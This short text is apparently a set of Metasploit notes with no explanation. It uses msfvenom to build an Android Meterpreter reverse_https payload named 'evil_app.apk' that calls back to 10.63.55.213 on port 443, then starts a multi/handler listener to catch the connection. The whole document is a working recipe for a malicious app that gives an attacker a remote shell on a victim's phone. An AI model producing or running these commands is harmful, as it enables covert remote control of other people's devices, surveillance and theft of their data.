msfconsole 

msfvenom -p android/meterpreter/reverse_https LHOST=10.63.55.213 LPORT=443 -o evil_app.apk

use exploit/multi/handler
set payload android/meterpreter/reverse_https
set LHOST =
set LPORT =
